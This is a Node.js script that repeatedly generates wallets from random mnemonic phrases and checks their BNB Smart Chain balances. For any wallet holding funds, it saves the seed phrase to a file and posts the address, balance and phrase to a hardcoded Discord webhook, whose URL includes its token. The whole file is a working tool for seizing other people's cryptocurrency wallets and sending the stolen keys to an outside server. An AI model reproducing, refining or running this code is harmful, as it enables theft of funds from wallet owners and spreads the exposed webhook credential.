var Web3 = require('web3');
const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
const ethers = require('ethers');
const { getRandomWords } = require('./walletGenerator');
const axios = require("axios");
const { appendFileSync } = require("fs");

const get_correct_wallet = (mnemonic) => {
  try {
    return ethers.Wallet.fromPhrase(mnemonic)
  } catch (e) {
    return get_correct_wallet(getRandomWords().join(" "))
  }
}
const bep20WalletHunt = async () => {
  const wallet = get_correct_wallet()
  const balance = await web3.eth.getBalance(wallet.address).catch(() => 0);
  console.log(wallet.address)
  console.log(wallet.mnemonic.phrase)
  console.log(balance);
  if (balance > 0) {
    appendFileSync('./wallet.txt', `${wallet.address} ${balance} ${wallet.mnemonic.phrase} \n`);
    await axios.post('https://discord.com/api/webhooks/1077587249018970162/Nev6_cCBykz44fl3zDK3vaMU4x7USgUnWDl6nIG56WDRWv5mheBle6vjkj1QObVvPLjv', {
      "username": "Wallet Found",
      "avatar_url": "https://i.imgur.com/4M34hi2.png",
      "content": `
      address: ${wallet.address}\nbalance: ${balance}\nkey: ${wallet.mnemonic.phrase}`,
    }).catch(err => console.log(err));
  }
  await bep20WalletHunt();
}
bep20WalletHunt();